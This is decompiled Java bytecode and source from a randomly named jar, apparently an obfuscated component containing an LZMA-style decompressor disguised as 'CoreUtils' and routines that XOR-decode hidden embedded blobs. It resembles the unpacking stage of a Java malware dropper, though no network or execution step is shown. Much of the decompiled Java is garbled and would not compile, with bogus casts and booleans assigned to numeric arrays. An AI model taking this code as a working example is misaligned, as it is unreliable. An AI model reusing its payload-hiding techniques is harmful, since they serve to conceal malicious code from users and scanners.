    //   386: istore #6
    //   388: iconst_0
    //   389: istore #7
    //   391: lconst_0
    //   392: lstore #10
    //   394: iconst_0
    //   395: istore #8
    //   397: goto -> 1514
    //   400: lload #10
    //   402: l2i
    //   403: aload_0
    //   404: getfield q : I
    //   407: iand
    //   408: istore #9
    //   410: aload_0
    //   411: dup
    //   412: getfield a : [S
    //   415: iload_1
    //   416: iconst_4
    //   417: ishl
    //   418: iload #9
    //   420: iadd
    //   421: invokevirtual a : (Ljava/lang/Object;I)I
    //   424: ifne -> 696
    //   427: aload_0
    //   428: getfield a : [[S
    //   431: lload #10
    //   433: l2i
    //   434: aload_0
    //   435: getfield l : I
    //   438: iand
    //   439: aload_0
    //   440: getfield j : I
    //   443: ishl
    //   444: iload #8
    //   446: sipush #255
    //   449: iand
    //   450: bipush #8
    //   452: aload_0
    //   453: getfield j : I
    //   456: isub
    //   457: iushr
    //   458: iadd
    //   459: aaload
    //   460: astore #8
    //   462: iload_1
    //   463: bipush #7
    //   465: if_icmpge -> 472
    //   468: iconst_1
    //   469: goto -> 473
    //   472: iconst_0
    //   473: ifne -> 581
    //   476: aload_0
    //   477: iload_2
    //   478: invokevirtual a : (I)B
    //   481: istore #12
    //   483: iconst_1
    //   484: istore #9
    //   486: iload #12
    //   488: bipush #7
    //   490: ishr
    //   491: iconst_1
    //   492: iand
    //   493: istore #13
    //   495: iload #12
    //   497: iconst_1
    //   498: ishl
    //   499: i2b
    //   500: istore #12
    //   502: aload_0
    //   503: aload #8
    //   505: iload #13
    //   507: iconst_1
    //   508: iadd
    //   509: bipush #8
    //   511: ishl
    //   512: iload #9
    //   514: iadd
    //   515: invokevirtual a : (Ljava/lang/Object;I)I
    //   518: istore #14
    //   520: iload #9
    //   522: iconst_1
    //   523: ishl
    //   524: iload #14
    //   526: ior
    //   527: istore #9
    //   529: iload #13
    //   531: iload #14
    //   533: if_icmpeq -> 565
    //   536: goto -> 554
    //   539: iload #9
    //   541: iconst_1
    //   542: ishl
    //   543: aload_0
    //   544: aload #8
    //   546: iload #9
    //   548: invokevirtual a : (Ljava/lang/Object;I)I
    //   551: ior
    //   552: istore #9
    //   554: iload #9
    //   556: sipush #256
    //   559: if_icmplt -> 539
    //   562: goto -> 573
    //   565: iload #9
    //   567: sipush #256
    //   570: if_icmplt -> 486
    //   573: iload #9
    //   575: i2b
    //   576: istore #8
    //   578: goto -> 611
    //   581: iconst_1
    //   582: istore #12
    //   584: iload #12
    //   586: iconst_1
    //   587: ishl
    //   588: aload_0
    //   589: aload #8
    //   591: iload #12
    //   593: invokevirtual a : (Ljava/lang/Object;I)I
    //   596: ior
    //   597: dup
    //   598: istore #12
    //   600: sipush #256
    //   603: if_icmplt -> 584
    //   606: iload #12
    //   608: i2b
    //   609: istore #8
    //   611: aload_0
    //   612: iload #8
    //   614: istore #9
    //   616: dup
    //   617: astore #12
    //   619: getfield a : [B
    //   622: aload #12
    //   624: dup
    //   625: getfield c : I
    //   628: dup_x1
    //   629: iconst_1
    //   630: iadd
    //   631: putfield c : I
    //   634: iload #9
    //   636: bastore
    //   637: aload #12
    //   639: getfield c : I
    //   642: aload #12
    //   644: getfield d : I
    //   647: if_icmplt -> 655
    //   650: aload #12
    //   652: invokevirtual b : ()V
    //   655: iload_1
    //   656: dup
    //   657: istore #12
    //   659: iconst_4
    //   660: if_icmpge -> 667
    //   663: iconst_0
    //   664: goto -> 686
    //   667: iload #12
    //   669: bipush #10
    //   671: if_icmpge -> 681
    //   674: iload #12
    //   676: iconst_3
    //   677: isub
    //   678: goto -> 686
    //   681: iload #12
    //   683: bipush #6
    //   685: isub
    //   686: istore_1
    //   687: lload #10
    //   689: lconst_1
    //   690: ladd
    //   691: lstore #10
    //   693: goto -> 1514
    //   696: aload_0
    //   697: dup
    //   698: getfield b : [S
    //   701: iload_1
    //   702: invokevirtual a : (Ljava/lang/Object;I)I
    //   705: iconst_1
    //   706: if_icmpne -> 921
    //   709: iconst_0
    //   710: istore #8
    //   712: aload_0
    //   713: dup
    //   714: getfield c : [S
    //   717: iload_1
    //   718: invokevirtual a : (Ljava/lang/Object;I)I
    //   721: ifne -> 761
    //   724: aload_0
    //   725: dup
    //   726: getfield f : [S
    //   729: iload_1
    //   730: iconst_4
    //   731: ishl
    //   732: iload #9
    //   734: iadd
    //   735: invokevirtual a : (Ljava/lang/Object;I)I
    //   738: ifne -> 817
    //   741: iload_1
    //   742: bipush #7
    //   744: if_icmpge -> 752
    //   747: bipush #9
    //   749: goto -> 754
    //   752: bipush #11
    //   754: istore_1
    //   755: iconst_1
    //   756: istore #8
    //   758: goto -> 817
    //   761: aload_0
    //   762: dup
    //   763: getfield d : [S
    //   766: iload_1
    //   767: invokevirtual a : (Ljava/lang/Object;I)I
    //   770: ifne -> 780
    //   773: iload #5
    //   775: istore #12
    //   777: goto -> 811
    //   780: aload_0
    //   781: dup
    //   782: getfield e : [S
    //   785: iload_1
    //   786: invokevirtual a : (Ljava/lang/Object;I)I
    //   789: ifne -> 799
    //   792: iload #6
    //   794: istore #12
    //   796: goto -> 807
    //   799: iload #7
    //   801: istore #12
    //   803: iload #6
    //   805: istore #7
    //   807: iload #5
    //   809: istore #6
    //   811: iload_2
    //   812: istore #5
    //   814: iload #12
    //   816: istore_2
    //   817: iload #8
    //   819: ifne -> 1375
    //   822: aload_0
    //   823: dup
    //   824: getfield k : [S
    //   827: iconst_0
    //   828: invokevirtual a : (Ljava/lang/Object;I)I
    //   831: ifne -> 850
    //   834: aload_0
    //   835: dup
    //   836: getfield e : [[S
    //   839: iload #9
    //   841: aaload
    //   842: invokevirtual b : (Ljava/lang/Object;)I
    //   845: istore #12
    //   847: goto -> 897
    //   850: aload_0
    //   851: dup
    //   852: getfield k : [S
    //   855: iconst_1
    //   856: invokevirtual a : (Ljava/lang/Object;I)I
    //   859: ifne -> 881
    //   862: bipush #8
    //   864: aload_0
    //   865: dup
    //   866: getfield f : [[S
    //   869: iload #9
    //   871: aaload
    //   872: invokevirtual b : (Ljava/lang/Object;)I
    //   875: iadd
    //   876: istore #12
    //   878: goto -> 897
    //   881: bipush #8
    //   883: bipush #8
    //   885: aload_0
    //   886: dup
    //   887: getfield l : [S
    //   890: invokevirtual b : (Ljava/lang/Object;)I
    //   893: iadd
    //   894: iadd
    //   895: istore #12
    //   897: iload #12
    //   899: istore #8
    //   901: iinc #8, 2
    //   904: iload_1
    //   905: bipush #7
    //   907: if_icmpge -> 915
    //   910: bipush #8
    //   912: goto -> 917
    //   915: bipush #11
    //   917: istore_1
    //   918: goto -> 1375
    //   921: iload #6
    //   923: istore #7
    //   925: iload #5
    //   927: istore #6
    //   929: iload_2
    //   930: istore #5
    //   932: aload_0
    //   933: dup
    //   934: getfield i : [S
    //   937: iconst_0
    //   938: invokevirtual a : (Ljava/lang/Object;I)I
    //   941: ifne -> 960
    //   944: aload_0
    //   945: dup
    //   946: getfield c : [[S
    //   949: iload #9
    //   951: aaload
    //   952: invokevirtual b : (Ljava/lang/Object;)I
    //   955: istore #12
    //   957: goto -> 1007
    //   960: aload_0
    //   961: dup
    //   962: getfield i : [S
    //   965: iconst_1
    //   966: invokevirtual a : (Ljava/lang/Object;I)I
    //   969: ifne -> 991
    //   972: bipush #8
    //   974: aload_0
    //   975: dup
    //   976: getfield d : [[S
    //   979: iload #9
    //   981: aaload
    //   982: invokevirtual b : (Ljava/lang/Object;)I
    //   985: iadd
    //   986: istore #12
    //   988: goto -> 1007
    //   991: bipush #8
    //   993: bipush #8
    //   995: aload_0
    //   996: dup
    //   997: getfield j : [S
    //   1000: invokevirtual b : (Ljava/lang/Object;)I
    //   1003: iadd
    //   1004: iadd
    //   1005: istore #12
    //   1007: iload #12
    //   1009: istore #8
    //   1011: iinc #8, 2
    //   1014: iload_1
    //   1015: bipush #7
    //   1017: if_icmpge -> 1025
    //   1020: bipush #7
    //   1022: goto -> 1027
    //   1025: bipush #10
    //   1027: istore_1
    //   1028: aload_0
    //   1029: dup
    //   1030: getfield b : [[S
    //   1033: iload #8
    //   1035: istore #12
    //   1037: iinc #12, -2
    //   1040: iload #12
    //   1042: iconst_4
    //   1043: if_icmpge -> 1051
    //   1046: iload #12
    //   1048: goto -> 1052
    //   1051: iconst_3
    //   1052: aaload
    //   1053: invokevirtual b : (Ljava/lang/Object;)I
    //   1056: dup
    //   1057: istore #9
    //   1059: iconst_4
    //   1060: if_icmplt -> 1372
    //   1063: iload #9
    //   1065: iconst_1
    //   1066: ishr
    //   1067: iconst_1
    //   1068: isub
    //   1069: istore #13
    //   1071: iconst_2
    //   1072: iload #9
    //   1074: iconst_1
    //   1075: iand
    //   1076: ior
    //   1077: iload #13
    //   1079: ishl
    //   1080: istore_2
    //   1081: iload #9
    //   1083: bipush #14
    //   1085: if_icmpge -> 1156
    //   1088: iconst_1
    //   1089: istore #14
    //   1091: iconst_0
    //   1092: istore #12
    //   1094: iconst_0
    //   1095: istore #15
    //   1097: goto -> 1141
    //   1100: aload_0
    //   1101: dup
    //   1102: getfield g : [S
    //   1105: iload_2
    //   1106: iload #9
    //   1108: isub
    //   1109: iconst_1
    //   1110: isub
    //   1111: iload #14
    //   1113: iadd
    //   1114: invokevirtual a : (Ljava/lang/Object;I)I
    //   1117: istore #16
    //   1119: iload #14
    //   1121: iconst_1
    //   1122: ishl
    //   1123: iload #16
    //   1125: iadd
    //   1126: istore #14
    //   1128: iload #12
    //   1130: iload #16
    //   1132: iload #15
    //   1134: ishl
    //   1135: ior
    //   1136: istore #12
    //   1138: iinc #15, 1
    //   1141: iload #15
    //   1143: iload #13
    //   1145: if_icmplt -> 1100
    //   1148: iload_2
    //   1149: iload #12
    //   1151: iadd
    //   1152: istore_2
    //   1153: goto -> 1375
    //   1156: iload_2
    //   1157: aload_0
    //   1158: iload #13
    //   1160: iconst_4
    //   1161: isub
    //   1162: istore #9
    //   1164: astore #12
    //   1166: iconst_0
    //   1167: istore #13
    //   1169: goto -> 1272
    //   1172: aload #12
    //   1174: dup
    //   1175: getfield g : I
    //   1178: iconst_1
    //   1179: iushr
    //   1180: putfield g : I
    //   1183: aload #12
    //   1185: getfield h : I
    //   1188: aload #12
    //   1190: getfield g : I
    //   1193: isub
    //   1194: bipush #31
    //   1196: iushr
    //   1197: istore_2
    //   1198: aload #12
    //   1200: dup
    //   1201: getfield h : I
    //   1204: aload #12
    //   1206: getfield g : I
    //   1209: iload_2
    //   1210: iconst_1
    //   1211: isub
    //   1212: iand
    //   1213: isub
    //   1214: putfield h : I
    //   1217: iload #13
    //   1219: iconst_1
    //   1220: ishl
    //   1221: iconst_1
    //   1222: iload_2
    //   1223: isub
    //   1224: ior
    //   1225: istore #13
    //   1227: aload #12
    //   1229: getfield g : I
    //   1232: ldc_w -16777216
    //   1235: iand
    //   1236: ifne -> 1269
    //   1239: aload #12
    //   1241: dup
    //   1242: getfield h : I
    //   1245: bipush #8
    //   1247: ishl
    //   1248: aload #12
    //   1250: invokevirtual a : ()I
    //   1253: ior
    //   1254: putfield h : I
    //   1257: aload #12
    //   1259: dup
    //   1260: getfield g : I
    //   1263: bipush #8
    //   1265: ishl
    //   1266: putfield g : I
    //   1269: iinc #9, -1
    //   1272: iload #9
    //   1274: ifne -> 1172
    //   1277: iload #13
    //   1279: iconst_4
    //   1280: ishl
    //   1281: iadd
    //   1282: aload_0
    //   1283: dup
    //   1284: getfield h : [S
    //   1287: astore #9
    //   1289: astore #12
    //   1291: aload #9
    //   1293: checkcast [S
    //   1296: astore #13
    //   1298: bipush #31
    //   1300: aload #13
    //   1302: arraylength
    //   1303: invokestatic a : (I)I
    //   1306: isub
    //   1307: istore #9
    //   1309: iconst_1
    //   1310: istore_2
    //   1311: iconst_0
    //   1312: istore #14
    //   1314: iconst_0
    //   1315: istore #15
    //   1317: goto -> 1350
    //   1320: aload #12
    //   1322: aload #13
    //   1324: iload_2
    //   1325: invokevirtual a : (Ljava/lang/Object;I)I
    //   1328: istore #16
    //   1330: iload_2
    //   1331: iconst_1
    //   1332: ishl
    //   1333: iload #16
    //   1335: iadd
    //   1336: istore_2
    //   1337: iload #14
    //   1339: iload #16
    //   1341: iload #15
    //   1343: ishl
    //   1344: ior
    //   1345: istore #14
    //   1347: iinc #15, 1
    //   1350: iload #15
    //   1352: iload #9
    //   1354: if_icmplt -> 1320
    //   1357: iload #14
    //   1359: iadd
    //   1360: dup
    //   1361: istore_2
    //   1362: ifge -> 1375
    //   1365: iload_2
    //   1366: iconst_m1
    //   1367: if_icmpeq -> 1527
    //   1370: iconst_0
    //   1371: ireturn
    //   1372: iload #9
    //   1374: istore_2
    //   1375: iload_2
    //   1376: i2l
    //   1377: lload #10
    //   1379: lcmp
    //   1380: ifge -> 1391
    //   1383: iload_2
    //   1384: aload_0
    //   1385: getfield p : I
    //   1388: if_icmplt -> 1393
    //   1391: iconst_0
    //   1392: ireturn
    //   1393: aload_0
    //   1394: iload_2
    //   1395: iload #8
    //   1397: istore #13
    //   1399: istore #9
    //   1401: dup
    //   1402: astore #12
    //   1404: getfield c : I
    //   1407: iload #9
    //   1409: isub
    //   1410: iconst_1
    //   1411: isub
    //   1412: dup
    //   1413: istore #9
    //   1415: ifge -> 1494
    //   1418: iload #9
    //   1420: aload #12
    //   1422: getfield d : I
    //   1425: iadd
    //   1426: istore #9
    //   1428: goto -> 1494
    //   1431: iload #9
    //   1433: aload #12
    //   1435: getfield d : I
    //   1438: if_icmplt -> 1444
    //   1441: iconst_0
    //   1442: istore #9
    //   1444: aload #12
    //   1446: getfield a : [B
    //   1449: aload #12
    //   1451: dup
    //   1452: getfield c : I
    //   1455: dup_x1
    //   1456: iconst_1
    //   1457: iadd
    //   1458: putfield c : I
    //   1461: aload #12
    //   1463: getfield a : [B
    //   1466: iload #9
    //   1468: iinc #9, 1
    //   1471: baload
    //   1472: bastore
    //   1473: aload #12
    //   1475: getfield c : I
    //   1478: aload #12
    //   1480: getfield d : I
    //   1483: if_icmplt -> 1491
    //   1486: aload #12
    //   1488: invokevirtual b : ()V
    //   1491: iinc #13, -1
    //   1494: iload #13
    //   1496: ifne -> 1431
    //   1499: lload #10
    //   1501: iload #8
    //   1503: i2l
    //   1504: ladd
    //   1505: lstore #10
    //   1507: aload_0
    //   1508: iconst_0
    //   1509: invokevirtual a : (I)B
    //   1512: istore #8
    //   1514: lload_3
    //   1515: lconst_0
    //   1516: lcmp
    //   1517: iflt -> 400
    //   1520: lload #10
    //   1522: lload_3
    //   1523: lcmp
    //   1524: iflt -> 400
    //   1527: aload_0
    //   1528: invokevirtual b : ()V
    //   1531: aload_0
    //   1532: invokevirtual a : ()V
    //   1535: aload_0
    //   1536: aconst_null
    //   1537: putfield c : [B
    //   1540: iconst_1
    //   1541: ireturn
  }

  private static void d(Object paramObject) {
    paramObject = paramObject;
    for (byte b = 0; b < paramObject.length; b++)
      paramObject[b] = false;
  }

  private static void e(Object paramObject) {
    paramObject = paramObject;
    for (byte b = 0; b < paramObject.length; b++) {
      if (paramObject[b] != null)
        d(paramObject[b]);
    }
  }

  private void c() {
    byte[] arrayOfByte = (byte[])this.a;
    for (byte b = 0; b < arrayOfByte.length; b++)
      arrayOfByte[b] = 0;
    this.c = false;
    this.d = false;
    this.e = false;
    this.b = null;
    this.g = false;
    this.h = false;
    this.c = null;
    this.j = false;
    this.k = false;
    this.l = false;
    e(this.a);
    d(this.a);
    d(this.b);
    d(this.b);
    d(this.c);
    d(this.d);
    d(this.e);
    d(this.f);
    e(this.b);
    d(this.g);
    d(this.h);
    d(this.i);
    e(this.c);
    e(this.d);
    d(this.j);
    this.m = 0;
    d(this.k);
    e(this.e);
    e(this.f);
    d(this.l);
    this.n = 0;
    this.o = 0;
    this.p = 0;
    this.q = 0;
  }

  /**
   * Decrypts the given data. This method seems to be a wrapper around the
   * actual decryption logic, which is implemented in the instance method a().
   *
   * @param encryptedData The data to decrypt.
   * @return The decrypted data.
   */
  public static byte[] decryptData(byte[] encryptedData) {
    CoreUtils decoder = null;
    try {
      byte[] header = a(encryptedData, 5);
      byte[] data = header;
      CoreUtils decoderInstance = decoder = new CoreUtils();
      int j;
      int k = (j = data[0] & 0xFF) % 9;
      int m = (j /= 9) % 5;
      j /= 5;
      int n = 0;
      int i1;
      for (i1 = 0; i1 < 4; i1++)
        n += (data[i1 + 1] & 0xFF) << i1 << 3;
      m = j;
      k = m;
      j = k;
      CoreUtils decoderContext = decoderInstance;
      i1 = j;
      k = k;
      CoreUtils decoderState;
      if ((decoderState = decoderContext).a == null || decoderState.j != i1 || decoderState.k != k) {
        decoderState.k = k;
        decoderState.l = (1 << k) - 1;
        decoderState.j = i1;
        k = 1 << decoderState.j + decoderState.k;
        decoderState.a = (short[]) new short[k][];
        for (i1 = 0; i1 < k; i1++)
          decoderState.a[i1] = new short[768];
      }
      int i = 1 << m;
      for (k = decoderContext.m; k < i; k++) {
        decoderContext.c[k] = new short[8];
        decoderContext.d[k] = new short[8];
      }
      decoderContext.m = k;
      for (k = decoderContext.n; k < i; k++) {
        decoderContext.e[k] = new short[8];
        decoderContext.f[k] = new short[8];
      }
      decoderContext.n = k;
      decoderContext.q = i - 1;
      i = n;
      decoderContext = decoderInstance;
      if (decoderContext.o != i) {
        decoderContext.o = i;
        decoderContext.p = Math.max(decoderContext.o, 1);
        m = Math.max(decoderContext.p, 4096);
        CoreUtils decoderState2;
        if ((decoderState2 = decoderContext).a == null || decoderState2.d != m)
          decoderState2.a = (short[]) new byte[m];
        decoderState2.d = m;
        decoderState2.c = false;
        decoderState2.e = false;
      }
      if (!(((data.length < 5) ? 0 : (!((j > 8 || k > 4 || m > 4) ? 0 : 1) ? 0 : ((i < 0) ? 0 : 1)))))
        throw new IllegalArgumentException();
      long outputSize = 0L;
      for (byte b = 0; b < 8; b++) {
        k = encryptedData[b + 5] & 0xFF;
        outputSize |= k << b << 3;
      }
      byte[] decryptedData = new byte[(int) outputSize];
      if (!decoder.decrypt(encryptedData, decryptedData))
        return null;
      encryptedData = decryptedData;
      return encryptedData;
    } finally {
      if (decoder != null)
        decoder.c();
    }
  }

  private static byte[] a(long paramLong) {
    byte[] arrayOfByte;
    (arrayOfByte = new byte[8])[0] = (byte)(int)(paramLong >>> 56L);
    arrayOfByte[1] = (byte)(int)(paramLong >>> 48L);
    arrayOfByte[2] = (byte)(int)(paramLong >>> 40L);
    arrayOfByte[3] = (byte)(int)(paramLong >>> 32L);
    arrayOfByte[4] = (byte)(int)(paramLong >>> 24L);
    arrayOfByte[5] = (byte)(int)(paramLong >>> 16L);
    arrayOfByte[6] = (byte)(int)(paramLong >>> 8L);
    arrayOfByte[7] = (byte)(int)paramLong;
    return arrayOfByte;
  }

  private static byte[] a(byte[] paramArrayOfbyte, int paramInt1, int paramInt2) {
    byte[] arrayOfByte = new byte[paramInt2 -= paramInt1];
    System.arraycopy(paramArrayOfbyte, paramInt1, arrayOfByte, 0, Math.min(paramArrayOfbyte.length - paramInt1, paramInt2));
    return arrayOfByte;
  }

  public static byte[] a(byte[] paramArrayOfbyte, int paramInt) {
    byte[] arrayOfByte = new byte[paramInt];
    System.arraycopy(paramArrayOfbyte, 0, arrayOfByte, 0, Math.min(paramArrayOfbyte.length, paramInt));
    return arrayOfByte;
  }

  public static byte[] a() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('\\');
    stringBuilder.append('b');
    byte[] arrayOfByte1 = a((String)b, stringBuilder.toString());
    byte[] arrayOfByte2 = a(b);
    for (byte b = 0; b < arrayOfByte1.length; b++)
      arrayOfByte1[b] = (byte)(arrayOfByte1[b] ^ arrayOfByte2[b % 8]);
    return arrayOfByte1;
  }

  public static byte[] b() {
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('\\');
    stringBuilder.append('c');
    byte[] arrayOfByte1 = a((String)a, stringBuilder.toString());
    byte[] arrayOfByte2 = a(a);
    for (byte b = 0; b < arrayOfByte1.length; b++)
      arrayOfByte1[b] = (byte)(arrayOfByte1[b] ^ arrayOfByte2[b % 8]);
    return arrayOfByte1;
  }

  static {
    String str2;
    StringBuilder stringBuilder2;
    (stringBuilder2 = new StringBuilder()).append('U');
    stringBuilder2.append('T');
    stringBuilder2.append('F');
    stringBuilder2.append('-');
    stringBuilder2.append('8');
    UTF8_CHARSET = stringBuilder2.toString();
  }
}


/* Location:              /Users/apple/Downloads/9z72uyksgx.jar!/net/java/l.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */